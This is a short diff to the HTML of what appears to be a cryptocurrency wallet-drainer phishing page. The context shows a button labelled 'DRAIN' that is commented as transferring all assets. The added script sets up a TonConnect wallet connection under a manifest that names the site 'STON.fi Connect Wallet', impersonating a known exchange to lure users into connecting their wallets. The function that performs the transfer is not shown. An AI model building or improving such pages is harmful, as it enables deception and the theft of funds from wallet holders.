@@ -50,6 +50,26 @@
     <div id="ton-connect"></div> <!-- Connect Wallet Button -->
     <button onclick="didtrans();" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->
 
+    <script>
+        // Create tonconnect-manifest.json dynamically to ensure it is available
+        const manifest = {
+            "url": window.location.origin,
+            "name": "STON.fi Connect Wallet",
+            "iconUrl": window.location.origin + "/logo.png",
+            "termsOfServiceUrl": window.location.origin + "/terms",
+            "privacyPolicyUrl": window.location.origin + "/privacy"
+        };
+
+        // Save the manifest JSON file to ensure availability
+        const blob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
+        const manifestURL = URL.createObjectURL(blob);
+        
+        // Initialize TonConnect with manifest URL
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: manifestURL,
+            buttonRootId: 'ton-connect'
+        });
+    </script>
     <script src="tonsdk.js"></script>
 </body>
 </html>
